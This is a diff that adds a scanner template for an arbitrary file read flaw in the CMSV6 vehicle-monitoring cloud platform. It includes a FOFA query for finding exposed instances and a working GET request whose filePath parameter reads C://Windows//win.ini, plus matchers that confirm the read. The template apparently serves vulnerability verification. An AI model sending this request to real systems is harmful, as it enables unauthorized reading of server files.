@@ -1,0 +1,24 @@
+## id: VEID-2024-0303
+## name: 鸿运(通天星CMSV6车载)主动安全监控云平台存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: 通天星CMSV6车载安全监控云平台存在任意文件读取漏洞
+## fofa-query: body="./open/webApi.html"||body="/808gps/"
+## verification: true
+
+
+GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+
+
+
+
+
+# @VEIL-STAMP: 2eba371fc83a71bdd5e13b0130033a424a4d256a79d957ff8a0d7dcbdcce8e89
